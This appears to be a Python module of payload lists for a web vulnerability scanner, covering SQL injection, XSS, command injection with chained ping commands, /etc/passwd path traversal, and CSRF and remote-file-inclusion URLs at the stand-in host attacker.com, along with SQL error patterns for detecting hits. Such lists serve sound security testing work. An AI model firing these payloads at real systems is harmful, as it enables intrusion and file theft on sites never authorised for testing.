SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' {0}",
    "' OR '1'='1' AND '1'='1",
    "'+OR+1=1--",
]

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
]

CMD_PAYLOADS = [
    "|| ping -c 1 127.0.0.1 ||",
    "; ping -c 1 127.0.0.1",
    "& ping -c 1 127.0.0.1",
    "&& ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1 |",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
]

HTML_PAYLOADS = [
    "<b>Injected HTML</b>",
    "<iframe src='javascript:alert(1)'></iframe>",
]

CSRF_PAYLOADS = [
    "<img src='http://attacker.com/csrf' />",
    "<iframe src='http://attacker.com/csrf'></iframe>",
]

RFI_PAYLOADS = [
    "http://attacker.com/malicious.php",
    "http://attacker.com/malicious.txt",
]

